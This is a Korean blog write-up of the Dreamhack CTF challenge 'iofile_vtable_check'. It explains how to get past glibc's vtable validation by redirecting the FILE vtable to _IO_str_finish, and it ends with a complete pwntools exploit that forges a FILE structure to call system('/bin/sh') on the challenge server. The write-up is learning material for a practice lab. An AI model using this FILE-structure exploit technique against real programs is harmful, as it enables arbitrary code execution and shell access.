---
title: Dreamhack - iofile_vtable_check
date: 2025-03-24 15:38:36 +0900
categories: [pwn]
---

[Bypass IO_validate_vtable — think storage](https://wyv3rn.tistory.com/114)

[_IO_FILE — hogbal](https://hogbal.tistory.com/34?category=1065564#_IO_FILE%20vtable%20overwrite-1)

먼저 vtable의 _IO_file_jumps 와 0x7f48e80adf10 <__GI__IO_str_overflow> 의 거리를 실제로 측정해보자

![1](/assets/img/2026/dh-iofile_vtable_check/1.png)
![2](/assets/img/2026/dh-iofile_vtable_check/2.png)

0x7f48e8406378-0x7f48e84062a0 = 0xd8 이다.

이후 이 정보들을 바탕으로 _IO_str_overflow 함수를 통해 쉘을 따려 했지만, 

```c
    if (*(long*)((char*) fp + 0xe0) != 0)
    {
        exit(0);
    }
```

이 부분 때문에 그게 안된다 저 위치는 system 함수로 덮어야하는데 0이 아니면 exit()을 호출하기 때문이다. 

이 함수 대신 _IO_str_finish로 풀어보겠다.

```c
void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

if문이 참일 때 실행되는 코드를 보면 fp를 _IO_strfile 로 형변환하고 거기서 _s를 가져오고, 거기서 _free_buffer 함수 포인터를 fp→_IO_buf_base를 인자로 호출한다.

_free_buffer를 system함수의 주소로 덮고, IO_buf_base를  /bin/sh의 주소로 조작하면 쉘을 얻을 수 있을 것이다.

그렇다면 if문을 어떻게 통과해야할까?

fp->_IO_buf_base 는 우리가 쉘을 따기 위해서 /bin/sh 주소라서 상관없다.

!(fp->_flags & _IO_USER_BUF) 여기서 우리는 플래그를 0으로 조작할 수 있는데 이러면 비트 & 에 의해 0이되고, !에 의해 1이된다. 따라서 if문을 통과할 수 있다.

_IO_strfile는 다음과 같이 정의된다.

```c
typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

여기서 _s는 _IO_str_fields 구조체인데 이는 다음과 같이 정의된다.

```c
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};
```

이 구조체 때문에 애를 좀 먹었다. overflow 함수처럼 바로 뒤에 넣으면 될 줄 알았는데 그게 아니였다…

저걸 제외하면 overflow 함수로 풀었을 때와 거의 동일하다.

```python
from pwn import *

p = remote("host1.dreamhack.games", 12009)
# p = process("./iofile_vtable_check", env={'LD_PRELOAD':'./libc.so.6'})
e = ELF("./iofile_vtable_check")
libc = ELF("./libc.so.6")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(), 16)
libc_base = stdout-libc.sym['_IO_2_1_stdout_']
system = libc_base+libc.sym['system']
binsh = libc_base+list(libc.search(b"/bin/sh"))[0]
fake_vtable = libc_base + libc.symbols['_IO_file_jumps']+0xc0
fp = e.symbols['fp']

print(f"libc_base : {hex(libc_base)}")

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(binsh) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock 
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite 
payload += p64(0)
payload += p64(system) 

p.sendlineafter(b"Data: ", payload)
p.interactive()
```